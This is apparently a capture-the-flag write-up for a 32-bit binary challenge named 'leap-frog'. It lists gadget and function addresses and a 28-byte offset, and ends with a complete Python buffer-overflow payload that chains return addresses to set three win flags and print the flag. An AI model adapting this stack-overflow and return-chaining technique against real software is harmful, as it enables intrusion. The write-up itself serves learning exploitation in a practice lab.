leap-frog:

Some of the flags are inaccessible, so you have to jump to the specific mov instructions.

"mov byte ptr [eax + 0x3d], 1 ; nop ; pop ebp ; ret (win1 = true)" gadget: 0x080485f3
"mov byte ptr [eax + 0x3e], 1 ; jmp 0x8048667 (win2 = true)" gadget: 0x08048622
"mov byte ptr [eax + 0x3f], 1 ; jmp 0x80486b4 (win3 = true)" gadget: 0x08048690
leapA(): 0x080485e6
leap2(): 0x080485fd
display_flag(): 0x080486b3
start buffer to ret: 28 bytes

You can't just call all of the flag sets directly, since the function references [ebp-4], which will be destroyed with the buffer overflow.



payload: python -c 'print "A"*24 + "\x54\xd2\xff\xff" + "\xe6\x85\x04\x08" + "\x90\x86\x04\x08" + "\x54\xd2\xff\xff" + "\x22\x86\x04\x08" + "B"*4 + "\xb3\x86\x04\x08"'
